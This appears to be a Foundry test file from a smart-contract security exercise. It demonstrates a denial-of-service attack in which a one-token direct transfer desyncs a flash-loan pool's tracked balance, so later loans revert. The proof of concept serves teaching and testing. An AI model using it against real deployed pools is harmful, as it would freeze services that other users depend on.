// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import "../../src/12. DoS-3/ShibaToken.sol";
import "../../src/12. DoS-3/ShibaPool.sol";
import "../../src/12. DoS-3/FlashLoanUser.sol";

contract TestDoS3 is Test {
    FlashLoanUser public flashLoanUser;
    ShibaPool public shibaPool;
    ShibaToken public shibaToken;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    uint256 constant INITIAL_SUPPLY = 1_000_000 ether;
    uint256 constant TOKENS_IN_POOL = 100_000 ether;
    uint256 constant ATTACKER_TOKENS = 10 ether;

    function setUp() public {
        vm.startPrank(deployer);
        shibaToken = new ShibaToken(INITIAL_SUPPLY);
        shibaPool = new ShibaPool(address(shibaToken));

        // Deployer sends some tokens to the attacker
        shibaToken.transfer(attacker, ATTACKER_TOKENS);

        // Deployer deposits tokens in the pool
        shibaToken.approve(address(shibaPool), TOKENS_IN_POOL);
        shibaPool.depositTokens(TOKENS_IN_POOL);

        vm.stopPrank();

        // Check initial balances
        assertEq(shibaToken.balanceOf(address(shibaPool)), TOKENS_IN_POOL);
        assertEq(shibaToken.balanceOf(attacker), ATTACKER_TOKENS);

        // User requests a flash loan of 10 tokens
        vm.startPrank(user);
        flashLoanUser = new FlashLoanUser(address(shibaPool));
        flashLoanUser.requestFlashLoan(10);
        vm.stopPrank();
    }

    function testDoS3Attack() public {
        vm.startPrank(attacker);
        // Attacker transfers tokens directly to the pool, bypassing the deposit function
        shibaToken.transfer(address(shibaPool), 1);
        vm.stopPrank();

        // Check that the pool balance is inconsistent with the actual token balance
        assertEq(shibaToken.balanceOf(address(shibaPool)), (TOKENS_IN_POOL + 1));
        assertEq(shibaPool.poolBalance(), TOKENS_IN_POOL);

        // User tries to request another flash loan of 10 tokens but it should fail
        vm.startPrank(user);
        vm.expectRevert(bytes("Accounting Issue"));
        flashLoanUser.requestFlashLoan(10);
        vm.stopPrank();
    }
}
